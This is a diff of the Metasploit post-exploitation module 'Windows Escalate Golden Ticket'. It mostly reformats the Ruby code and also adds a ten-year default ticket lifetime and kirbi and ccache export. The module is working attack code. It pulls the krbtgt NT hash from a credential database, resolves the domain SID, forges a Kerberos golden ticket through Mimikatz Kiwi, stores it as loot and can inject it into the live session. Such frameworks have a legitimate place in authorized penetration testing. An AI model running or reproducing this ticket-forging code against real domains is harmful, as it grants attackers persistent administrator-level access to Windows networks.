@@ -1,7 +1,7 @@
-require 'msf/core'
-require 'msf/core/post/windows/netapi'
-require 'msf/core/post/windows/kiwi'
-require 'msf/core/post/windows/error'
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::NetAPI
@@ -10,37 +10,53 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Error
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'         => 'Windows Escalate Golden Ticket',
-      'Description'  => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Escalate Golden Ticket',
+        'Description' => %q{
           This module will create a Golden Kerberos Ticket using the Mimikatz Kiwi Extension. If no
-        options are applied it will attempt to identify the current domain, the domain administrator
-        account, the target domain SID, and retrieve the krbtgt NTLM hash from the database. By default
-        the well-known Administrator's groups 512, 513, 518, 519, and 520 will be applied to the ticket.
+          options are applied it will attempt to identify the current domain, the domain administrator
+          account, the target domain SID, and retrieve the krbtgt NTLM hash from the database. By default
+          the well-known Administrator's groups 512, 513, 518, 519, and 520 will be applied to the ticket.
         },
-      'License'      => MSF_LICENSE,
-      'Author'       => [
-        'Ben Campbell'
-      ],
-      'Platform'     => [ 'win' ],
-      'SessionTypes' => [ 'meterpreter' ],
-      'References'   =>
-            [
-              ['URL', 'https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos']
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Ben Campbell'
+        ],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'References' => [
+          ['URL', 'https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos']
+        ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              kiwi_exec_cmd
+              stdapi_railgun_api
             ]
-    ))
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
         OptBool.new('USE', [true, 'Use the ticket in the current session', false]),
         OptString.new('USER', [false, 'Target User']),
         OptString.new('DOMAIN', [false, 'Target Domain']),
-        OptString.new('KRBTGT_HASH', [false, 'KRBTGT NTLM Hash']),
+        OptString.new('KRBTGT_HASH', [false, 'KRBTGT NT Hash']),
         OptString.new('Domain SID', [false, 'Domain SID']),
         OptInt.new('ID', [false, 'Target User ID']),
-        OptString.new('GROUPS', [false, 'ID of Groups (Comma Seperated)'])
-      ], self.class)
+        OptString.new('GROUPS', [false, 'ID of Groups (Comma Separated)']),
+        OptInt.new('END_IN', [true, 'End in ... Duration in hours, default 10 YEARS (~87608 hours)', 87608])
+      ]
+    )
   end
 
   def run
@@ -51,9 +67,7 @@ class MetasploitModule < Msf::Post
     krbtgt_hash = datastore['KRBTGT_HASH']
     domain_sid = datastore['SID']
     id = datastore['ID'] || 0
-
-    groups = []
-    groups = datastore['GROUPS'].split(',').map(&:to_i) if datastore['GROUPS']
+    end_in = datastore['END_IN'] || 87608
 
     unless domain
       print_status('Searching for the domain...')
@@ -66,13 +80,11 @@ class MetasploitModule < Msf::Post
     end
 
     unless krbtgt_hash
-      if framework.db.active
-        print_status('Searching for krbtgt hash in database...')
-        krbtgt_hash = lookup_krbtgt_hash(domain)
-        fail_with(Failure::Unknown, 'Unable to find krbtgt hash in database') unless krbtgt_hash
-      else
-        fail_with(Failure::BadConfig, 'No database, please supply the krbtgt hash')
-      end
+      fail_with(Failure::BadConfig, 'No database, please supply the krbtgt hash') unless framework.db.active
+
+      print_status('Searching for krbtgt hash in database...')
+      krbtgt_hash = lookup_krbtgt_hash(domain)
+      fail_with(Failure::Unknown, 'Unable to find krbtgt hash in database') unless krbtgt_hash
     end
 
     unless domain_sid
@@ -102,24 +114,48 @@ class MetasploitModule < Msf::Post
       end
     end
 
+    # Golden Ticket requires an NTHash
+    if Metasploit::Framework::Hashes.identify_hash(krbtgt_hash) != 'nt'
+      fail_with(Failure::BadConfig, 'KRBTGT_HASH must be an NTHash')
+    end
+    nt_hash = krbtgt_hash.split(':')[1]
+
     print_status("Creating Golden Ticket for #{domain}\\#{user}...")
-    ticket = client.kiwi.golden_ticket_create(user, domain, domain_sid, krbtgt_hash, id, groups)
+    ticket = client.kiwi.golden_ticket_create({
+      user: user,
+      domain_name: domain,
+      domain_sid: domain_sid,
+      krbtgt_hash: nt_hash,
+      id: id,
+      group_ids: datastore['GROUPS'],
+      end_in: end_in
+    })
 
     if ticket
       print_good('Golden Ticket Obtained!')
-      ticket_location = store_loot("golden.ticket",
-                                   "binary/kirbi",
-                                   session,
-                                   ticket,
-                                   "#{domain}\\#{user}-golden_ticket.kirbi",
-                                   "#{domain}\\#{user} Golden Ticket")
+      kirbi_ticket = Base64.decode64(ticket)
+      kirbi_location = store_loot('golden_ticket',
+                                  'kirbi',
+                                  session,
+                                  kirbi_ticket,
+                                  "#{domain}\\#{user}-golden_ticket.kirbi",
+                                  "#{domain}\\#{user} Golden Ticket")
+      print_status("Kirbi ticket saved to #{kirbi_location}")
+      krb_cred = Rex::Proto::Kerberos::Model::KrbCred.decode(kirbi_ticket)
 
-      print_status("Ticket saved to #{ticket_location}")
+      ccache_ticket = Msf::Exploit::Remote::Kerberos::TicketConverter.kirbi_to_ccache(krb_cred)
+      ccache_location = store_loot('golden_ticket',
+                                   'ccache',
+                                   session,
+                                   ccache_ticket.to_binary_s,
+                                   "#{domain}\\#{user}-golden_ticket.ccache",
+                                   "#{domain}\\#{user} Golden Ticket")
+      print_status("ccache ticket saved to #{ccache_location}")
 
       if datastore['USE']
-        print_status("Attempting to use the ticket...")
+        print_status('Attempting to use the ticket...')
         client.kiwi.kerberos_ticket_use(ticket)
-        print_good("Kerberos ticket applied successfully")
+        print_good('Kerberos ticket applied successfully')
       end
     else
       fail_with(Failure::Unknown, 'Unable to create ticket')
@@ -133,26 +169,28 @@ class MetasploitModule < Msf::Post
     cch_referenced_domain_name = referenced_domain_name_buffer = 100
 
     res = client.railgun.advapi32.LookupAccountNameA(
-                               nil,
-                               domain,
-                               sid_buffer,
-                               cb_sid,
-                               referenced_domain_name_buffer,
-                               cch_referenced_domain_name,
-                               1)
+      nil,
+      domain,
+      sid_buffer,
+      cb_sid,
+      referenced_domain_name_buffer,
+      cch_referenced_domain_name,
+      1
+    )
 
     if !res['return'] && res['GetLastError'] == INSUFFICIENT_BUFFER
       sid_buffer = cb_sid = res['cbSid']
       referenced_domain_name_buffer = cch_referenced_domain_name = res['cchReferencedDomainName']
 
       res = client.railgun.advapi32.LookupAccountNameA(
-          nil,
-          domain,
-          sid_buffer,
-          cb_sid,
-          referenced_domain_name_buffer,
-          cch_referenced_domain_name,
-          1)
+        nil,
+        domain,
+        sid_buffer,
+        cb_sid,
+        referenced_domain_name_buffer,
+        cch_referenced_domain_name,
+        1
+      )
     elsif !res['return']
       return nil
     end
@@ -173,9 +211,10 @@ class MetasploitModule < Msf::Post
     krbtgt_hash = nil
 
     krbtgt_creds = Metasploit::Credential::Core.joins(:public, :private).where(
-        metasploit_credential_publics: { username: 'krbtgt' },
-        metasploit_credential_privates: { type: 'Metasploit::Credential::NTLMHash' },
-        workspace_id: myworkspace.id)
+      metasploit_credential_publics: { username: 'krbtgt' },
+      metasploit_credential_privates: { type: 'Metasploit::Credential::NTLMHash' },
+      workspace_id: myworkspace_id
+    )
 
     if krbtgt_creds
 
@@ -193,7 +232,7 @@ class MetasploitModule < Msf::Post
           print_good("Using #{cred.realm}:#{cred.public.username}:#{krbtgt_hash}")
           return krbtgt_hash
         # We have found multiple krbtgt hashes in our target domain?!
-        elsif krbtgt_creds_realm.length > 0
+        elsif !krbtgt_creds_realm.empty?
           krbtgt_creds = krbtgt_creds_realm
         end
 
